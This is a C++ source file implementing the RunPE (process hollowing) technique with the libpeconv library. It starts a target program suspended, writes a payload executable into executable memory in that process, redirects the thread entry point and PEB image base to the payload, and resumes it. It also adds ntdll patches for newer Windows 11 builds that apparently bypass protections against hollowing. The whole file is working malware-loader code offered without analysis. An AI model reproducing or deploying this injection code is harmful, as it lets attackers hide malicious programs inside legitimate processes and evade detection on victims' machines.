#include "PatchNT.hpp"

using namespace peconv;
bool PatchRequired = false;

bool CheckOsVer() {
    NTSYSAPI NTSTATUS rtlGetVersion(PRTL_OSVERSIONINFOW lpVersionInformation);
    RTL_OSVERSIONINFOW osVersionInfo = { 0 };
    osVersionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);

    HMODULE hNtdll = GetModuleHandleA("ntdll");
    if (!hNtdll) {
        return false;
    }

    auto rtlGetVersionFunc = reinterpret_cast<decltype(&rtlGetVersion)>(GetProcAddress(hNtdll, "RtlGetVersion"));
    NTSTATUS status = rtlGetVersionFunc(&osVersionInfo);
    if (status != S_OK) {
        return false;
    }

    if (osVersionInfo.dwMajorVersion > 10 ||
        (osVersionInfo.dwMajorVersion == 10 && osVersionInfo.dwBuildNumber >= 26100)) {
        return true;
    }
    return false;
}

bool CreateSuspendedProcess(IN LPCTSTR path, IN LPCTSTR cmdLine, OUT PROCESS_INFORMATION& processInfo) {
    STARTUPINFO startupInfo;
    memset(&startupInfo, 0, sizeof(STARTUPINFO));
    startupInfo.cb = sizeof(STARTUPINFO);
    memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));
    if (!CreateProcess(path, (LPTSTR)cmdLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo)) {
        std::cerr << "CreateProcess failed, Error = " << std::hex << GetLastError() << "\n";
        return false;
    }
    return true;
}

bool TerminateProcess(DWORD processId) {
    bool isKilled = false;
    HANDLE processHandle = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
    if (!processHandle) {
        return false;
    }

    if (TerminateProcess(processHandle, 0)) {
        isKilled = true;
    }
    else {
        std::cerr << "Could not terminate the process. PID = " << std::dec << processId << std::endl;
    }

    CloseHandle(processHandle);
    return isKilled;
}

bool ReadRemoteMemory(HANDLE processHandle, ULONGLONG remoteAddress, OUT void* buffer, const size_t bufferSize) {
    memset(buffer, 0, bufferSize);
    if (!ReadProcessMemory(processHandle, LPVOID(remoteAddress), buffer, bufferSize, NULL)) {
        std::cerr << "Cannot read from the remote memory!\n";
        return false;
    }
    return true;
}

BOOL UpdateRemoteEntryPoint(PROCESS_INFORMATION& processInfo, ULONGLONG entryPointVa, bool is32Bit) {
#ifdef _DEBUG
    std::cout << "Writing new EP: " << std::hex << entryPointVa << std::endl;
#endif

#if defined(_WIN64)
    if (is32Bit) {
        WOW64_CONTEXT wow64Context = { 0 };
        memset(&wow64Context, 0, sizeof(WOW64_CONTEXT));
        wow64Context.ContextFlags = CONTEXT_INTEGER;

        if (!Wow64GetThreadContext(processInfo.hThread, &wow64Context)) {
            return FALSE;
        }

        wow64Context.Eax = static_cast<DWORD>(entryPointVa);
        return Wow64SetThreadContext(processInfo.hThread, &wow64Context);
    }
#endif
    CONTEXT context = { 0 };
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(processInfo.hThread, &context)) {
        return FALSE;
    }

#if defined(_M_AMD64)
    context.Rcx = entryPointVa;
#elif defined(_M_ARM64)
    context.X23 = entryPointVa;
#else
    context.Eax = static_cast<DWORD>(entryPointVa);
#endif
    return SetThreadContext(processInfo.hThread, &context);
}

ULONGLONG GetRemotePebAddress(PROCESS_INFORMATION& processInfo, bool is32Bit) {
#if defined(_WIN64)
    if (is32Bit) {
        WOW64_CONTEXT wow64Context;
        memset(&wow64Context, 0, sizeof(WOW64_CONTEXT));
        wow64Context.ContextFlags = CONTEXT_INTEGER;
        if (!Wow64GetThreadContext(processInfo.hThread, &wow64Context)) {
            std::cerr << "Wow64 cannot get context!\n";
            return 0;
        }
        return static_cast<ULONGLONG>(wow64Context.Ebx);
    }
#endif
    ULONGLONG pebAddress = 0;
    CONTEXT context;
    memset(&context, 0, sizeof(CONTEXT));
    context.ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(processInfo.hThread, &context)) {
        return 0;
    }
#if defined(_M_AMD64)
    pebAddress = context.Rdx;
#elif defined(_M_ARM64)
    pebAddress = context.X23;
#else
    pebAddress = context.Ebx;
#endif
    return pebAddress;
}

inline ULONGLONG GetImageBasePebOffset(bool is32Bit) {
    ULONGLONG imageBaseOffset = is32Bit ? sizeof(DWORD) * 2 : sizeof(ULONGLONG) * 2;
    return imageBaseOffset;
}

bool RedirectToPayload(BYTE* loadedPe, PVOID loadBase, PROCESS_INFORMATION& processInfo, bool is32Bit) {
    DWORD entryPointRva = get_entry_point_rva(loadedPe);
    ULONGLONG entryPointVa = (ULONGLONG)loadBase + entryPointRva;

    if (UpdateRemoteEntryPoint(processInfo, entryPointVa, is32Bit) == FALSE) {
        std::cerr << "Cannot update remote EP!\n";
        return false;
    }

    ULONGLONG remotePebAddress = GetRemotePebAddress(processInfo, is32Bit);
    if (!remotePebAddress) {
        std::cerr << "Failed getting remote PEB address!\n";
        return false;
    }

    LPVOID remoteImageBase = (LPVOID)(remotePebAddress + GetImageBasePebOffset(is32Bit));
    const size_t imageBaseSize = is32Bit ? sizeof(DWORD) : sizeof(ULONGLONG);
    SIZE_T written = 0;

    if (!WriteProcessMemory(processInfo.hProcess, remoteImageBase, &loadBase, imageBaseSize, &written)) {
        std::cerr << "Cannot update ImageBaseAddress!\n";
        return false;
    }
    return true;
}

bool RunPe(BYTE* loadedPe, size_t payloadImageSize, PROCESS_INFORMATION& processInfo, bool is32Bit) {
    if (loadedPe == NULL) {
        return false;
    }

    LPVOID remoteBase = VirtualAllocEx(processInfo.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteBase == NULL) {
        std::cerr << "Could not allocate memory in the remote process\n";
        return false;
    }

#ifdef _DEBUG
    printf("Allocated remote ImageBase: %p size: %lx\n", remoteBase, static_cast<ULONG>(payloadImageSize));
#endif

    if (!relocate_module(loadedPe, payloadImageSize, (ULONGLONG)remoteBase)) {
        std::cerr << "Could not relocate the module!\n";
        return false;
    }

    update_image_base(loadedPe, (ULONGLONG)remoteBase);

    SIZE_T written = 0;
    if (!WriteProcessMemory(processInfo.hProcess, remoteBase, loadedPe, payloadImageSize, &written)) {
        std::cerr << "Writing to the remote process failed!\n";
        return false;
    }

    printf("Loaded at: %p\n", remoteBase);

    if (!RedirectToPayload(loadedPe, remoteBase, processInfo, is32Bit)) {
        std::cerr << "Redirecting failed!\n";
        return false;
    }

    if (!is32Bit && PatchRequired && !ZwQueryVirtualMemory(processInfo.hProcess, remoteBase)) {
        std::cerr << "Failed to apply the required patch on NTDLL\n";
    }

    std::cout << "Resuming the process: " << std::dec << processInfo.dwProcessId << std::endl;
    ResumeThread(processInfo.hThread);
    return true;
}

bool IsTargetCompatible(BYTE* payloadBuf, size_t payloadSize, LPCTSTR targetPath) {
    if (!payloadBuf) {
        return false;
    }

    const WORD payloadSubsystem = peconv::get_subsystem(payloadBuf);
    size_t targetSize = 0;
    BYTE* targetPe = load_pe_module(targetPath, targetSize, false, false);
    if (!targetPe) {
        return false;
    }

    const WORD targetSubsystem = peconv::get_subsystem(targetPe);
    const bool is64bitTarget = peconv::is64bit(targetPe);
    peconv::free_pe_buffer(targetPe);
    targetPe = NULL;
    targetSize = 0;

    if (is64bitTarget != peconv::is64bit(payloadBuf)) {
        std::cerr << "Incompatible target bitness!\n";
        return false;
    }

    if (payloadSubsystem != IMAGE_SUBSYSTEM_WINDOWS_GUI && targetSubsystem != payloadSubsystem) {
        std::cerr << "Incompatible target subsystem!\n";
        return false;
    }
    return true;
}

bool RunPe(IN LPCTSTR payloadPath, IN LPCTSTR targetPath, IN LPCTSTR cmdLine) {
    if (CheckOsVer()) {
        PatchRequired = true;
    }

    size_t payloadImageSize = 0;
    BYTE* loadedPe = peconv::load_pe_module(payloadPath, payloadImageSize, false, false);
    if (!loadedPe) {
        std::cerr << "Loading failed!\n";
        return false;
    }

    const WORD payloadArchitecture = get_nt_hdr_architecture(loadedPe);
    if (payloadArchitecture != IMAGE_NT_OPTIONAL_HDR32_MAGIC && payloadArchitecture != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        std::cerr << "Not supported payload architecture!\n";
        return false;
    }

    const bool is32bitPayload = !peconv::is64bit(loadedPe);
#ifndef _WIN64
    if (!is32bitPayload) {
        std::cerr << "Incompatible payload architecture!\n"
            << "Only 32-bit payloads can be injected from a 32-bit loader!\n";
        return false;
    }
#endif

    if (targetPath == NULL) {
        std::cerr << "No target supplied!\n";
        return false;
    }

    if (!IsTargetCompatible(loadedPe, payloadImageSize, targetPath)) {
        free_pe_buffer(loadedPe, payloadImageSize);
        return false;
    }

    PROCESS_INFORMATION processInfo = { 0 };
    bool isCreated = CreateSuspendedProcess(targetPath, cmdLine, processInfo);
    if (!isCreated) {
        std::cerr << "Creating target process failed!\n";
        free_pe_buffer(loadedPe, payloadImageSize);
        return false;
    }

    if (PatchRequired) {
#ifndef _WIN64
        NtManageHotPatch32(processInfo.hProcess);
#else
        NtManageHotPatch64(processInfo.hProcess);
#endif
    }

    bool isOk = RunPe(loadedPe, payloadImageSize, processInfo, is32bitPayload);
    if (!isOk) {
        TerminateProcess(processInfo.dwProcessId);
    }

    free_pe_buffer(loadedPe, payloadImageSize);
    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);
    return isOk;
}
